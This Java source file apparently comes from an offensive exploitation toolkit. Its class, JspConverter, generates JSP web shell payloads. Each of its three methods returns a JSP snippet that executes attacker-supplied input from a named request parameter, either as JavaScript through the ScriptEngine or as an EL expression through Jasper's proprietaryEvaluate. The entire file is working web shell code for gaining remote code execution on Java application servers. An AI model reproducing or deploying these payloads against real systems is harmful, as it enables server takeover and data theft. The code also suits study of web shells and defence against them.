package com.h2tg.ysogate.bullet.defineClass;

public class JspConverter
{
    public static String jsp2js(String p)
    {
        String payload="<%\n" +
                "     javax.script.ScriptEngine engine = new javax.script.ScriptEngineManager().getEngineByName(\"js\");\n" +
                "     engine.put(\"request\", request);\n" +
                "     engine.put(\"response\", response);\n" +
                "     engine.eval(request.getParameter(\""+p+"\"));\n" +
                "%>";
        return payload;
    }

    public static String jsp2js_short(String p)
    {
        String payload="<%\n" +
                "    out.println(new javax.script.ScriptEngineManager().getEngineByName(\"js\").eval(request.getParameter(\""+p+"\")));\n" +
                "%>";
        return payload;
    }

    public static String jsp2el(String p)
    {
        String payload="<%\n" +
                "out.print(org.apache.jasper.runtime.PageContextImpl.proprietaryEvaluate(request.getParameter(\""+p+"\"), String.class, pageContext, null));\n" +
                "%>";
        return payload;
    }
}
